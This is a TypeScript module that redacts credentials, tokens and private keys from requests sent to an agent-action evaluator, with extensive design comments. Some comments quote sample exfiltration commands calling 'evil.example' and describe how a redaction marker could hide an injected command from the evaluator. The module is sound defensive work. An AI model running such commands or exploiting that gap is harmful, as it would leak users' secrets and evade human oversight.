/**
 * Secret redaction for everything that leaves the machine in a Jev request.
 *
 * Two layers, deliberately different in how wide they cast:
 *
 * 1. **The shared floor**: `SECRET_PATTERNS`, the list the `sanitize-*`
 *    builtins BLOCK on. Blocking has to be narrow, because a false positive
 *    there denies work the user wanted.
 * 2. **The redactor's own margin**, everything else in this file. Redaction only
 *    swaps characters for a marker, and a false positive costs Jev a few
 *    characters of context it almost never needs to judge an action, while a
 *    miss sends a live credential to a third-party API. So this layer takes the
 *    shapes the floor cannot afford: assignments named like a secret
 *    (`GITHUB_TOKEN=…`, `"api_key": "…"`, `--password …`), header values,
 *    credentials inside URLs, whole PEM blocks, the values of this process's own
 *    secret-named environment variables, and long random-looking tokens.
 *
 * It is the same split `src/audit/redact-example.ts` makes, for the same reason.
 *
 * Every replacement is a visible `<redacted:label>` marker, never a silent
 * deletion, so Jev can still see THAT a secret was there (which matters to the
 * `secret-exposure` policy) and the count is auditable. Only the value is
 * replaced: `OPENAI_API_KEY=<redacted:…>` still says which credential it was.
 *
 * Two of the margin's rules are deliberately BLUNT, and it is worth knowing
 * why before narrowing them. A credential header (`Authorization`,
 * `Proxy-Authorization`, `X-Authorization`, `api-key`, `x-api-key`, `Cookie`,
 * `Set-Cookie`) and a credential FLAG (`--password`, `--token`, `sshpass -p`
 * and the rest of `CREDENTIAL_FLAGS` / `GATED_CREDENTIAL_FLAGS`) give up their
 * whole value: to the end of the line, or to the closing quote when the value
 * sits inside one, and to the end of the argument for a flag. Nothing about
 * the value is examined — not a scheme allowlist, not a token shape, not
 * whether it reads like code or like a reference.
 *
 * The name is read in every form it is written in: a header line, a `curl -H`
 * argument, a JSON field, YAML — including a block scalar whose value is the
 * bounded INDENTED BLOCK UNDERNEATH (`continuationValue`) — an env assignment, and the
 * two-argument setter form `req.Header.Set("Authorization", "…")`, where the
 * separator is a comma.
 *
 * Three boundaries are structural rather than blunt, and all three exist
 * because a marker that swallows text hides an INJECTED command from the
 * evaluator as readily as it hides a credential from Jev (see
 * `credentialValueEnd`, `credentialArgumentEnd` and `continuationValue`): an
 * unquoted value ends at the shell separator that starts a second command
 * unless it has already taken a `name=` pair (a cookie or SigV4 list), an
 * argument ends at the quote that closes the string the command itself sits
 * in, and a value written on the NEXT line is one line — the block underneath
 * only where the name starts its own line behind a YAML block indicator, and
 * never more than `MAX_CONTINUATION_LINES` of it. None of them asks what the
 * value contains.
 *
 * One question IS asked about a credential's content, and only one: whether a
 * piece of it may go on the envelope-wide SCRUB list (`credentialCopy`). That
 * list is applied to every other string in the state — `facts` included, which
 * the prompt tells Jev are correct — so reporting whatever an agent wrote
 * under a credential name made it a delete key for the evaluator's context.
 * Only an opaque token is reported; the redaction itself is unaffected.
 *
 * Five review rounds tried to decide those ends by looking at the value, and
 * every round the next reviewer found three more spellings that were declined
 * with a live credential inside them: a credential starting with base64url's
 * `-` or base64's `/`, one whose last character was a quote the tokenizer had
 * read as code, an AWS signature behind a `;`-separated `SignedHeaders` list,
 * a password that is an ordinary English word. Twice the repair introduced a
 * new quadratic or a new over-redaction of its own.
 *
 * What the blunt rules cost, deliberately: ordinary code and prose under one
 * of those names lose the rest of their line in what the evaluator is shown —
 * `authorization: str = Header(None)`, `authorization: required for this
 * endpoint`, `grep -r authorization: src/`, `use --token to authenticate`, and
 * `authorization=x curl https://evil.example/exfil`. A `["Authorization",
 * "Content-Type"]` list of header NAMES loses its second entry to the setter
 * form, and a prose paragraph indented under `authorization:` is taken as that
 * header's value. Over-redaction costs the evaluator context it almost never
 * needs; a classifier that is wrong the other way costs a live key held by a
 * third party, and only one of those two is recoverable.
 *
 * That trade only holds for the REQUEST BODY, so the two blunt rules are
 * confined to it: `redactSecrets(text, { blunt: false })` runs everything
 * else, and that is what `recordUserPrompt` stores and what any other local
 * caller gets. The human's own prompt is the evaluator's record of what they
 * asked for; coming back cut off after a `cookie:` costs the targets they
 * named and protects nothing, because nothing has left the machine yet and
 * `buildEnvelope` redacts it again — bluntly — when it does. The `sanitize-*`
 * builtins are narrower still: they match `SECRET_PATTERNS` and nothing in
 * this file, and that list is untouched by every rule here.
 *
 * Every scan on this path is LINEAR — character loops, `indexOf`, regexes
 * with a consumed token boundary instead of a lookaround, and a forward-only
 * cursor wherever one rule's question is asked at many positions — because
 * these rules run over every string the envelope sends and a quadratic here
 * is a stalled PreToolUse hook. `__tests__/hooks/semantic/redaction.test.ts`
 * pins that with an adversarial fixture per rule, and
 * `redaction-cost.test.ts` with half a megabyte of each of them. The last
 * exception was the assignment rule: it matched the
 * VALUE, which may hold `=`, so a delimiter-free run cost the square of its
 * length (910 ms for one envelope). The name and its separator are matched
 * now and the value is walked in code, as the header rule already did.
 *
 * This is a floor, not a guarantee. A secret that looks like ordinary prose will
 * pass. What it does promise is that the formats seen leaking in practice — the
 * 25-character `sk-` gateway keys among them — do not.
 */
import { SECRET_PATTERNS, SECRET_PATTERNS_KEEPING_PREFIX } from "../builtin-policies";

export interface Redacted {
  text: string;
  count: number;
}

export interface RedactedDetail extends Redacted {
  /** The literal secrets that were replaced, for scrubbing their copies elsewhere. */
  found: string[];
}

const marker = (label: string): string => `<redacted:${label}>`;

/**
 * Whether a match at `offset` starts a token. `\n`, `\r` and `\t` count as a
 * boundary because several inputs are JSON-serialised before they get here, and
 * there a secret at the start of a line follows the two characters `\` `n`.
 *
 * Checked in code, never as a regex lookbehind: a lookbehind drops JSC's regex
 * JIT to its interpreter, which measured ~100µs per rule per 2 KB string — 3 ms
 * of every envelope across the vendor list alone.
 */
function atTokenBoundary(whole: string, offset: number, tokenChars = /[A-Za-z0-9_-]/): boolean {
  if (offset === 0 || !tokenChars.test(whole[offset - 1])) return true;
  return offset >= 2 && whole[offset - 2] === "\\" && /[nrt]/.test(whole[offset - 1]);
}

// ── Layer 1: the shared floor ────────────────────────────────────────────────

/**
 * `SECRET_PATTERNS`, made global — and, for the ones that end in a token
 * character class, extended to the END of the token they matched.
 *
 * The extension is what stops a partial redaction leaking the tail of a key.
 * `sk-[A-Za-z0-9]{20,}` stops at the first `-`, so a LiteLLM key whose 21st
 * character is a hyphen used to come out as `<redacted:OpenAI API key>-x7Qd`.
 * `ghp_[A-Za-z0-9]{36}` and `AKIA[A-Z0-9]{16}` are fixed-width and would do the
 * same to anything longer. The two patterns that end on a literal (`…@` for
 * connection strings, `-----` for a PEM header) are not extended: what follows
 * them is a hostname or a newline, not more of the secret.
 *
 * A pattern listed in `SECRET_PATTERNS_KEEPING_PREFIX` matched context in front
 * of the secret rather than the secret itself — the generic `sk-` entry's token
 * boundary, a consuming group because a lookbehind would cost the blocking
 * policy its regex JIT. Group 1 goes back in front of the marker. Membership is
 * read from that set rather than guessed from the pattern's source: a future
 * entry whose first group captures part of the SECRET would look identical to a
 * `startsWith("(")` test, and the redactor would print the secret it removed.
 */
const SHARED_RULES: ReadonlyArray<readonly [RegExp, string, boolean]> = SECRET_PATTERNS.map(([re, label]) => {
  const flags = re.flags.includes("g") ? re.flags : re.flags + "g";
  const extend = /[}+]$/.test(re.source);
  const keepsPrefix = SECRET_PATTERNS_KEEPING_PREFIX.has(re);
  return [new RegExp(extend ? `(?:${re.source})[A-Za-z0-9_-]*` : re.source, flags), label, keepsPrefix] as const;
});

/** Exposed for the test that pins which shared patterns are extended. */
export const SHARED_PATTERN_EXTENDED: ReadonlyArray<boolean> = SECRET_PATTERNS.map(([re]) => /[}+]$/.test(re.source));

// ── Layer 2: the redactor's margin ───────────────────────────────────────────

/**
 * A whole PEM private-key block, header to footer.
 *
 * The shared pattern matches the `BEGIN … PRIVATE KEY` armour header only —
 * enough for a detector, useless for a redactor, which would replace the header
 * and send the base64 key body underneath it. Each header is walked to its own
 * footer if it has one (`PEM_BODY_RUN_RE`), and otherwise takes the lines that
 * follow it while they still look like key material (base64 of 16+ characters,
 * or an encrypted key's `Proc-Type:`-style header line), separated by real or
 * JSON-escaped newlines — a block whose footer the envelope's length cap cut
 * away (`redactPemBlocks` adds a last line shorter than that when it ends the
 * text or meets the cut marker: a block cut mid-line). A lone header in a
 * command — a `grep` for the armour line across `*.pem` — therefore takes
 * nothing after it. The body of a complete block is limited to what a PEM body
 * contains, so a header and a footer quoted separately in documentation do not
 * take the prose between them.
 *
 * "JSON-escaped" is one to four backslashes before the `n`: a block inside a
 * JSON string that was itself serialised again (a service-account file passed
 * as a string argument, then stringified by the envelope at depth 2) arrives as
 * `\\n`. The count is bounded so a run of backslashes cannot backtrack.
 */
const PEM_ARMOUR_HEAD = String.raw`-----BEGIN[ A-Z0-9]*PRIVATE KEY(?: BLOCK)?-----`;
/** Every armour header in the text; the block after each one is measured in code. */
const PEM_HEADER_RE = new RegExp(PEM_ARMOUR_HEAD, "g");
/**
 * The longest run of characters a PEM body may contain, anchored at a header.
 *
 * It replaces the lazy `(?:body)*?-----END…` scan the rule used to open with.
 * That scan read to the end of the string before failing whenever no footer
 * FOR A PRIVATE KEY followed — from every header in the text, which made a
 * page of repeated armour lines (a `grep` hit list across a key directory)
 * quadratic, at up to 576 strings per envelope. Choosing the alternative on
 * `text.includes("-----END")` only moved the hole: eight characters of an
 * unrelated `-----END CERTIFICATE-----` put every header back on the lazy
 * path, and 2 000 characters of armour cost 1.5 ms again.
 *
 * A footer is reachable from a header exactly when it starts inside this run,
 * because a body character is the only thing the lazy scan could cross. The
 * run is the same for every start position inside it, so it is computed once
 * per run rather than once per header, and the whole walk stays linear.
 */
const PEM_BODY_RUN_RE = /(?:[A-Za-z0-9+/=\s:,.-]|\\{1,4}[nrt])*/y;
/** The key lines of a block whose footer the envelope's cap cut away. */
const PEM_TO_CUT = String.raw`(?:(?:\s|\\{1,4}[nrt])+(?:[A-Za-z0-9+/=]{16,}|[A-Za-z-]+:[^\n\\]*))*`;
const PEM_TO_CUT_RE = new RegExp(PEM_TO_CUT, "y");
/**
 * The short tail of a key line a cut split, right after a block that lost its
 * footer. Matched in code at the end of such a block: as an optional group at
 * the end of the block regex it cost that regex ~8x on every string.
 */
const PEM_CUT_FRAGMENT_RE = /(?:\s|\\{1,4}[nrt])+[A-Za-z0-9+/=]{1,15}(?=\s*(?:$|…\[))/y;

/** Every PEM private-key block, whole or cut short, as one marker each. */
function redactPemBlocks(text: string, counter: { n: number; found: string[] }): string {
  if (!text.includes("-----BEGIN")) return text;
  const footers = pemFooters(text);
  let fi = 0;
  // The body run last measured, reused by every header that starts inside it.
  let runFrom = -1;
  let runEnd = -1;
  let out = "";
  let last = 0;
  PEM_HEADER_RE.lastIndex = 0;
  for (let m = PEM_HEADER_RE.exec(text); m !== null; m = PEM_HEADER_RE.exec(text)) {
    const bodyStart = m.index + m[0].length;
    while (fi < footers.length && footers[fi].start < bodyStart) fi++;
    let end = -1;
    if (fi < footers.length) {
      if (bodyStart < runFrom || bodyStart > runEnd) {
        PEM_BODY_RUN_RE.lastIndex = bodyStart;
        runFrom = bodyStart;
        runEnd = bodyStart + (PEM_BODY_RUN_RE.exec(text)?.[0].length ?? 0);
      }
      if (footers[fi].start <= runEnd) end = footers[fi].end;
    }
    if (end < 0) {
      // No footer this block can reach: take the key lines the cap left.
      PEM_TO_CUT_RE.lastIndex = bodyStart;
      end = bodyStart + (PEM_TO_CUT_RE.exec(text)?.[0].length ?? 0);
      PEM_CUT_FRAGMENT_RE.lastIndex = end;
      const f = PEM_CUT_FRAGMENT_RE.exec(text);
      if (f) end += f[0].length;
    }
    out += text.slice(last, m.index) + marker("private key");
    counter.n++;
    counter.found.push(text.slice(m.index, end));
    last = end;
    PEM_HEADER_RE.lastIndex = end;
  }
  PEM_HEADER_RE.lastIndex = 0;
  return last === 0 ? text : out + text.slice(last);
}

/** Where every private-key footer in the text sits, in one pass. */
function pemFooters(text: string): Array<{ start: number; end: number }> {
  const out: Array<{ start: number; end: number }> = [];
  if (!text.includes("-----END")) return out;
  PEM_FOOTER_RE.lastIndex = 0;
  for (let m = PEM_FOOTER_RE.exec(text); m !== null; m = PEM_FOOTER_RE.exec(text)) {
    out.push({ start: m.index, end: m.index + m[0].length });
  }
  PEM_FOOTER_RE.lastIndex = 0;
  return out;
}

/**
 * A private-key footer. What survives the complete-block rule is a footer whose
 * header is not in the same string — almost always because the envelope's
 * head/tail cap dropped the header into the omitted middle and kept the last
 * lines of the key in the tail. `redactOrphanFooters` takes those lines.
 */
const PEM_FOOTER_RE = /-----END[ A-Z0-9]*PRIVATE KEY(?: BLOCK)?-----/g;
const BASE64_CHAR = /[A-Za-z0-9+/=]/;

/** Length of a JSON-escaped `\n`/`\r`/`\t` (one to four backslashes) ending just before `end`, or 0. */
function escapeBefore(text: string, end: number): number {
  const c = text[end - 1];
  if (c !== "n" && c !== "r" && c !== "t") return 0;
  let i = end - 1;
  while (i > 0 && text[i - 1] === "\\" && end - i <= 4) i--;
  return i < end - 1 ? end - i : 0;
}

/** Whether only whitespace separates `at` from the start of the text or the envelope's cut marker. */
function startsAfterCut(text: string, at: number, floor: number): boolean {
  let j = at;
  while (j > floor && /\s/.test(text[j - 1])) j--;
  return j === 0 || text[j - 1] === "…";
}

/**
 * The key lines in front of a footer that has no header, walking back from the
 * footer one line at a time. A line is a whole run of base64 between line
 * separators (real or escaped newlines). Every line must be 16+ characters
 * except two: the one right before the footer (a PEM body's short last line)
 * and one that starts the text or follows the cut marker (a line the cut
 * split). A short last line on its own counts only in that second position
 * too. Prose never qualifies: its lines have spaces in them.
 *
 * Returns where the key material starts, or -1.
 */
function orphanKeyStart(text: string, footerAt: number, floor: number): number {
  const lines: Array<{ start: number; len: number }> = [];
  let pos = footerAt;
  for (;;) {
    let j = pos;
    while (j > floor) {
      if (/\s/.test(text[j - 1])) j--;
      else {
        const esc = escapeBefore(text, j);
        if (esc === 0) break;
        j -= esc;
      }
    }
    if (j === pos && lines.length > 0) break;
    let k = j;
    while (k > floor && BASE64_CHAR.test(text[k - 1]) && escapeBefore(text, k) === 0) k--;
    const len = j - k;
    if (len === 0) break;
    // A whole line: it starts the text, or follows a separator, a quote or the cut marker.
    if (k > floor && !/[\s"'`…]/.test(text[k - 1]) && escapeBefore(text, k) === 0) break;
    if (lines.length > 0 && len < 16 && !startsAfterCut(text, k, floor)) break;
    lines.push({ start: k, len });
    pos = k;
  }
  if (lines.length === 0) return -1;
  if (lines.length === 1 && lines[0].len < 16 && !startsAfterCut(text, lines[0].start, floor)) return -1;
  return lines[lines.length - 1].start;
}

/** Redact key lines in front of every footer that lost its header. */
function redactOrphanFooters(text: string, counter: { n: number; found: string[] }): string {
  if (!text.includes("-----END")) return text;
  let out = "";
  let last = 0;
  PEM_FOOTER_RE.lastIndex = 0;
  for (let m = PEM_FOOTER_RE.exec(text); m !== null; m = PEM_FOOTER_RE.exec(text)) {
    const start = orphanKeyStart(text, m.index, last);
    if (start < 0) continue;
    const end = m.index + m[0].length;
    out += text.slice(last, start) + marker("private key");
    counter.n++;
    counter.found.push(text.slice(start, end));
    last = end;
  }
  PEM_FOOTER_RE.lastIndex = 0;
  return last === 0 ? text : out + text.slice(last);
}

/**
 * Vendor prefixes the shared list does not carry. They stay OUT of
 * `SECRET_PATTERNS` on purpose: the audit redactor masks `export
 * SLACK_BOT_TOKEN=xoxb-…` as an "assigned secret" and its tests pin that label,
 * and several of these are too new to have earned a blocking rule.
 */
const VENDOR_RULES: ReadonlyArray<readonly [RegExp, string]> = (
  [
    [String.raw`gh[pousr]_[A-Za-z0-9]{30,}`, "GitHub token"],
    [String.raw`github_pat_[A-Za-z0-9_]{30,}`, "GitHub fine-grained token"],
    [String.raw`glpat-[A-Za-z0-9_-]{20,}`, "GitLab token"],
    [String.raw`xox[abposr]-[A-Za-z0-9-]{10,}`, "Slack token"],
    [String.raw`xapp-\d-[A-Za-z0-9-]{10,}`, "Slack app token"],
    [String.raw`hf_[A-Za-z0-9]{30,}`, "Hugging Face token"],
    [String.raw`npm_[A-Za-z0-9]{36}`, "npm token"],
    [String.raw`pypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]{20,}`, "PyPI token"],
    [String.raw`(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{16,}`, "Stripe secret key"],
    [String.raw`whsec_[A-Za-z0-9+/=]{20,}`, "webhook signing secret"],
    [String.raw`ASIA[A-Z0-9]{16}`, "AWS temporary access key ID"],
    [String.raw`ya29\.[A-Za-z0-9_-]{20,}`, "Google OAuth token"],
    [String.raw`GOCSPX-[A-Za-z0-9_-]{20,}`, "Google OAuth client secret"],
    [String.raw`1//0[A-Za-z0-9_-]{30,}`, "Google refresh token"],
    [String.raw`SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}`, "SendGrid API key"],
    [String.raw`gsk_[A-Za-z0-9]{30,}`, "Groq API key"],
    [String.raw`xai-[A-Za-z0-9]{30,}`, "xAI API key"],
    [String.raw`pplx-[A-Za-z0-9]{30,}`, "Perplexity API key"],
    [String.raw`r8_[A-Za-z0-9]{30,}`, "Replicate token"],
    [String.raw`sbp_[A-Za-z0-9]{30,}`, "Supabase token"],
    [String.raw`sb_secret_[A-Za-z0-9_-]{16,}`, "Supabase secret key"],
    [String.raw`dapi[0-9a-f]{32}`, "Databricks token"],
    [String.raw`shp(?:at|ca|pa|ss)_[0-9a-fA-F]{32}`, "Shopify token"],
    [String.raw`lin_api_[A-Za-z0-9]{30,}`, "Linear API key"],
    [String.raw`ntn_[A-Za-z0-9]{30,}`, "Notion token"],
    [String.raw`ATATT3[A-Za-z0-9_=-]{30,}`, "Atlassian API token"],
    [String.raw`dp\.(?:st|ct|sa|scim|audit|pt)\.[A-Za-z0-9_-]{30,}`, "Doppler token"],
    [String.raw`tskey-[a-z]+-[A-Za-z0-9-]{16,}`, "Tailscale key"],
    [String.raw`do[oprt]_v1_[a-f0-9]{64}`, "DigitalOcean token"],
    [String.raw`AGE-SECRET-KEY-1[0-9A-Z]{50,}`, "age secret key"],
    // Any other `sk-` token, down to the 16 characters the collector's own
    // redactor (crates/fpai-collect/src/redact.rs) uses.
    [String.raw`sk-[A-Za-z0-9_-]{16,}`, "sk- API key"],
  ] as const
).map(([src, label]) => [new RegExp(`${src}[A-Za-z0-9_-]*`, "g"), label] as const);

/** Webhook URLs whose path IS the credential. */
const WEBHOOK_RULES: ReadonlyArray<readonly [RegExp, string]> = [
  [/(hooks\.slack\.com\/(?:services|workflows|triggers)\/)[A-Za-z0-9_/-]{16,}/g, "Slack webhook"],
  [/(discord(?:app)?\.com\/api\/webhooks\/\d+\/)[A-Za-z0-9_-]{20,}/g, "Discord webhook"],
  [/(api\.telegram\.org\/(?:file\/)?bot)\d{6,}:[A-Za-z0-9_-]{30,}/g, "Telegram bot token"],
];

/**
 * `scheme://user:password@host` on ANY scheme; the shared list covers
 * databases only.
 *
 *   1  the token boundary in front of the scheme
 *   2  the scheme   3  the user   4  the password
 *
 * Group 1 is what keeps the scan LINEAR, the same device and the same reason
 * as `ASSIGNMENT_NAME_RE`. A `\b` here matched after every `-` and every `.`,
 * because both are non-word characters, and `[a-z][a-z0-9+.-]*` then consumed
 * the rest of the run and backtracked over it at each of those starts: a
 * 4 000-character run of `a-a-a-…` cost 11 ms, 8 000 cost 45 ms, and the two
 * URL rules together were 44 of the 47 ms the whole redactor spent on it. A
 * boundary character that the scheme itself cannot contain makes every
 * position inside such a run fail in one step. The boundary is consumed rather
 * than looked behind (a lookbehind drops JSC's regex JIT) and re-emitted in
 * front of the replacement. A scheme in a real URL always follows a character
 * outside `[A-Za-z0-9_.+-]` — or starts the string, or a JSON-escaped line.
 */
const URL_CREDENTIALS_RE = /(^|\\[nrt]|[^A-Za-z0-9_.+-])([a-z][a-z0-9+.-]*:\/\/)([^\s/@:"'<>]+):([^\s/@"'<>]+)@/gi;

/**
 * `scheme://<token>@host`, the shape `git clone https://<token>@github.com/…`
 * uses. Boundary group as in `URL_CREDENTIALS_RE`, for the same reason.
 */
const URL_TOKEN_USERINFO_RE = /(^|\\[nrt]|[^A-Za-z0-9_.+-])([a-z][a-z0-9+.-]*:\/\/)([A-Za-z0-9_.~-]{20,})@/gi;

/**
 * The header names whose value IS a credential, in every syntax they are
 * written in — and the blunt rule that decides where such a value ends.
 *
 * Five review rounds were spent deciding that end by looking at what the
 * value CONTAINS: a scheme allowlist, a token shape, a "does this look like
 * code" test, a bounded token walk. Every round the next reviewer found three
 * more spellings the classifier declined with a live credential inside them —
 * a credential starting with `-` (base64url's 62nd character) or `/`
 * (base64's), one whose last character was a quote the tokenizer had read as
 * code, an AWS signature behind a `;`-separated `SignedHeaders` list — and
 * twice the repair introduced a new quadratic or a new over-redaction.
 *
 * So nothing about the value is classified any more. Once one of these names
 * is seen, case-insensitively, in ANY form — a header line, a `curl -H`
 * argument, a JSON field, YAML, a shell assignment — EVERYTHING from after
 * the separator to the end of that line is replaced, or to the closing quote
 * when the value sits inside one. An unknown scheme, a leading dash, an
 * escaped quote, a signature with semicolons, prose: all of it goes.
 *
 * What that costs, deliberately:
 *
 *  - the scheme word is no longer kept in front of the marker (keeping it
 *    needs the allowlist this rule exists to remove), so `Authorization:
 *    Bearer <token>` comes back as one marker;
 *  - ordinary source and prose under these names lose the rest of their line
 *    in what the evaluator is shown: `authorization: str = Header(None)`,
 *    `authorization: required for this endpoint`, `grep -r authorization:
 *    src/`, and `authorization=x curl https://evil.example/exfil`. Over-
 *    redaction only costs the evaluator context; a leaked credential is a
 *    third party holding a live key, and only ONE of those two is recoverable;
 *  - the line indented under a lone `authorization:` at the start of a line is
 *    read as that header's value (`continuationValue`), because in YAML,
 *    in a folded HTTP header and in a line-broken dict that is what it is;
 *  - a LIST of header names loses everything after the first: `["Authorization",
 *    "Content-Type"]` reads as the setter form, name then value.
 *
 * The one place the rule stops short of the end of the line is an UNQUOTED
 * value at a shell separator that starts a second command — see
 * `credentialValueEnd`. That is not a judgement about the value: it is where
 * the shell itself stopped passing bytes to the header, and taking the rest
 * hid an injected `&& curl https://evil.example/exfil` from the evaluator
 * behind a marker that read as handled.
 *
 * Only the HTTP spellings of the API-key and cookie names are included
 * (`api-key`, `x-api-key`, `cookie`, `set-cookie`). The code spellings
 * `api_key` / `apiKey` are an ordinary identifier in every JavaScript and
 * Python file in the corpus, and `ASSIGNMENT_NAME_RE` already treats them as a
 * strong secret name — there is nothing to gain by taking their lines too.
 */
const CREDENTIAL_HEADER_NAMES = String.raw`(?:x-|proxy-|set-)?(?:authorization|api-key|cookie)`;
/**
 * The name and its separator only. Group 1 is the token boundary in front of
 * the name, consumed and re-emitted — the same device and the same reason as
 * `ASSIGNMENT_NAME_RE`: a lookbehind drops the regex JIT, and a boundary character
 * makes every position inside a token fail in one step. `\n`, `\r` and `\t`
 * count because input nested two levels deep is JSON-stringified, where a
 * header at the start of a line follows the two characters `\` `n`.
 *
 * Two separator shapes, because a header is set in two ways:
 *
 *   `Authorization: …`, `authorization=…`, `"Authorization": "…"`  — a separator
 *   `req.Header.Set("Authorization", "…")`, `headers.set("x-api-key", …)`,
 *   `xhr.setRequestHeader("Authorization", …)`, `[("x-api-key", "…")]` — a COMMA
 *
 * The comma form requires the closing quote of the name, which is what keeps
 * it off ordinary prose ("the authorization, which expired"): every setter and
 * every tuple writes the name as a string literal. Both alternatives are
 * anchored after the name and consume a bounded run, so the scan stays linear.
 */
const CREDENTIAL_HEADER_RE = new RegExp(
  String.raw`(^|\\[nrt]|[^A-Za-z0-9_-])(${CREDENTIAL_HEADER_NAMES})(?:(?:\\?["'])?[ \t]*(?::=|[:=])[ \t]*|(?:\\?["'])[ \t]*,[ \t]*)`,
  "gi",
);
/** The same names as a whole field name, for structured input. */
const CREDENTIAL_FIELD_RE = new RegExp(`^${CREDENTIAL_HEADER_NAMES}$`, "i");

/** Which of the three credential headers this name is, for the marker. */
function credentialHeaderLabel(name: string): string {
  const n = name.toLowerCase();
  if (n.endsWith("cookie")) return "cookie header";
  if (n.endsWith("api-key")) return "api key header";
  return "authorization header";
}

/**
 * Whether this header's value can open with a public SCHEME word (`Bearer`,
 * `AWS4-HMAC-SHA256`). Only `Authorization` and its kin can: a cookie's value
 * starts with the session pair and an API key header holds the key itself, so
 * for those the first piece is the credential.
 */
function headerHasScheme(name: string): boolean {
  return credentialHeaderLabel(name) === "authorization header";
}

/**
 * A marker this file already wrote.
 *
 * Rules run from the most exact to the most heuristic, so a credential header
 * can arrive with part of its value already replaced — `Credential=<redacted:AWS
 * access key ID>/20260922, Signature=…` after the shared floor took the access
 * key. Such a value is still redacted whole (the signature behind the marker is
 * a credential), but a value that is NOTHING but markers is already done, which
 * is what makes a second pass over redacted text a no-op.
 */
const AUTH_MARKER_HEAD = "<redacted:";
const AUTH_MARKER_RE = /<redacted:[^>]*>/g;
const withoutMarkers = (s: string): string => s.replace(AUTH_MARKER_RE, "");

/** A token without the shell quotes around it or the punctuation after it. */
function bareArgument(t: string): string {
  const s = t.replace(/[,;]+$/, "");
  const m = /^(["'])([\s\S]*)\1$/.exec(s);
  // A quote with no partner inside the token belongs to the code AROUND it —
  // `app --password <tok>"` ends at a quote nothing opened — and leaving it on
  // means the secret reported for the scrub pass matches no copy of itself.
  return m ? m[2] : s.replace(/^["']|["']$/g, "");
}

/** Where the scan has got to, and the quote that is open there. */
interface QuoteCursor {
  pos: number;
  /** The exact delimiter that opened: `"`, `'`, or a JSON-escaped `\"` / `\'`. */
  open: string | null;
}

/**
 * The tail of an English contraction: the one `'` in prose that is not a quote.
 * Bounded to three characters, read off a slice, so the scan stays linear.
 */
const CONTRACTION_TAIL_RE = /^(?:s|t|d|m|ll|re|ve)(?![A-Za-z])/i;

/**
 * Whether the `'` at `at` is an apostrophe rather than an opening quote:
 * `it's`, `don't`, `we're`. A human's message and a file's prose go through
 * this scanner too, and one contraction used to leave the cursor believing a
 * string was open for the rest of the line — which disabled the value's own
 * quote in `sshpass -p 'pw'` and sent the password out verbatim.
 *
 * A letter on BOTH sides is not enough (`-p'pw'` has one), so the tail has to
 * be one of the seven English contraction endings AND end the word there.
 */
function isApostrophe(text: string, at: number): boolean {
  const before = text[at - 1];
  if (before === undefined || !/[A-Za-z]/.test(before)) return false;
  return CONTRACTION_TAIL_RE.test(text.slice(at + 1, at + 4));
}

/**
 * Carry the quote state forward to `to`, in ONE pass over each character.
 *
 * The header's value ends at the quote the header itself sits inside —
 * `curl -H "Authorization: …"`, `{"Authorization: …"}`, `['Authorization: …']`
 * all write the name and the value inside one string — and finding that quote
 * by scanning BACK from each name is quadratic on a line with many names. The
 * cursor only ever moves forward, so the whole walk is linear however many
 * names the line holds. Quote state resets at every real line break, so an
 * apostrophe in prose cannot make a value on a later line end early — and
 * where it does confuse the state on its own line, the fallback is the end of
 * the line, which redacts MORE, not less.
 *
 * A JSON-ESCAPED newline resets only a single quote, not a double one. `\n`
 * inside a double-quoted shell string (`printf "%s\n" "$V"`) is an ordinary
 * two-character escape, and resetting there made that string's CLOSING quote
 * read as an opening one: from that point the cursor believed a string was
 * open, which disabled the separator rule and hid everything after the next
 * credential name on the line — an injected second command included. A stray
 * single quote in prose is the case the reset was added for, and that one
 * still resets.
 */
function advanceQuotes(text: string, cur: QuoteCursor, to: number): void {
  let i = cur.pos;
  while (i < to) {
    const c = text[i];
    if (c === "\n" || c === "\r") {
      cur.open = null;
      i++;
      continue;
    }
    if (c === "\\") {
      const n = text[i + 1];
      if (n === undefined) {
        i++;
        continue;
      }
      if (n === "n" || n === "r") {
        if (cur.open === "'" || cur.open === "\\'") cur.open = null;
        i += 2;
        continue;
      }
      if (n === '"' || n === "'") {
        const q = c + n;
        if (cur.open === null) cur.open = q;
        else if (cur.open === q) cur.open = null;
        i += 2;
        continue;
      }
      i += 2;
      continue;
    }
    if (c === '"' || (c === "'" && !isApostrophe(text, i))) {
      if (cur.open === null) cur.open = c;
      else if (cur.open === c) cur.open = null;
      i++;
      continue;
    }
    i++;
  }
  cur.pos = i;
}

/**
 * The delimiter a VALUE opens at `start`, or null when it opens none.
 *
 * The enclosing delimiter is never one. In `{"command": "app --password pw"}`
 * the `"` after `pw` closes the JSON string the command sits in, and taking it
 * as the value's own quote put `pw"}` on the scrub list; but in
 * `{"command": "app --password \"pw\""}` the value's own delimiter is the
 * escaped `\"`, and in `… -p 'pw' …` it is the `'` — and skipping those
 * because SOMETHING was open truncated the credential at the first space,
 * reduced it to a single backslash, or left it in the request in clear.
 */
function valueOwnQuote(text: string, start: number, close: string | null): string | null {
  const c = text[start];
  if (c === "\\" && (text[start + 1] === '"' || text[start + 1] === "'")) {
    const d = text.slice(start, start + 2);
    return d === close ? null : d;
  }
  if (c === '"' || c === "'") return c === close ? null : c;
  return null;
}

/** What may follow a quote that really closed the value around it. */
const VALUE_CLOSED_BY = /[\s,;&|}\])]/;

/**
 * Whether the quote at `at` closes the value, or is one the shell glues to
 * more of the same argument: `curl -H "Authorization: hmac "$PW"" https://x`
 * is ONE header value in three quoted pieces, and stopping at the first of
 * them sends the rest of it to Jev. A quote that closed something is followed
 * by whitespace, a separator, a closing bracket or the end of the text.
 */
function quoteClosesValue(text: string, at: number, close: string): boolean {
  const after = at + close.length;
  const c = text[after];
  if (c === undefined) return true;
  if (VALUE_CLOSED_BY.test(c)) return true;
  return c === "\\" && /[nr]/.test(text[after + 1] ?? "");
}

/**
 * Where a credential header's value ends: the closing quote when it is inside
 * one, otherwise the end of the line — or, for an UNQUOTED value, the shell
 * separator that starts a second command.
 *
 * The separator rule is not a judgement about the value, it is where the shell
 * itself would have stopped passing bytes to the header: `echo cookie: && curl
 * https://evil.example/exfil` writes a credential NAME and then a SEPARATE
 * command, and taking the rest of the line put that command behind a marker —
 * a seven-character prefix hid an exfiltration from the evaluator while the
 * count still read `redactions: 1`.
 *
 * The one credential value that legitimately holds a separator is a parameter
